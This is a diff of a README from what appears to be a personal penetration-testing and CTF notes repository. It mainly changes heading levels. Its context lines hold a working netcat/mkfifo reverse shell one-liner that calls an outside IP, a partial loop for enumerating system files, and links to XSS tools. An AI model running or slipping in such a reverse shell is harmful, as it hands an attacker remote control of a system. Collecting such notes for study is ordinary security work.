@@ -4,7 +4,7 @@ This repository contains my personal notes and tricks that I've gathered while w
 
 Please note that these notes are a work in progress, and I'll be continuously adding more content as I progress through the challenges and machines.
 
-#### Introduction
+### Introduction
 
 In this repository, you will find a compilation of various tricks, commands, and techniques that can be useful during penetration testing activities. These notes are intended to assist in the process of hacking and securing systems.
 #### [notes](./other/notes.md)
@@ -15,9 +15,9 @@ In this repository, you will find a compilation of various tricks, commands, and
 
 ---
 
-#### Reverse shells
+### Reverse shells
 
-```nc
+```sh
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
 ```
 
@@ -76,7 +76,7 @@ for cmd in "history" "id" "echo $PATH" "cat /etc/crontab" "sudo -V " "cat /proc/
 #### [other](./other/src/linux_priv_esc.md)
 
 ---
-#### [windows](./other/windows.md)
+### [windows](./other/windows.md)
 
 ---
 
@@ -109,8 +109,7 @@ for cmd in "history" "id" "echo $PATH" "cat /etc/crontab" "sudo -V " "cat /proc/
 - [x8](https://github.com/Sh1Yo/x8)(like arjun)
 - [dalfox](https://github.com/hahwul/dalfox)(find xxs)
 - [XXSHunter](https://xsshunter.trufflesecurity.com/app/#/)
-
-[other links](./other/src/links.md)
+#### [other links](./other/src/links.md)
 
 ---
 
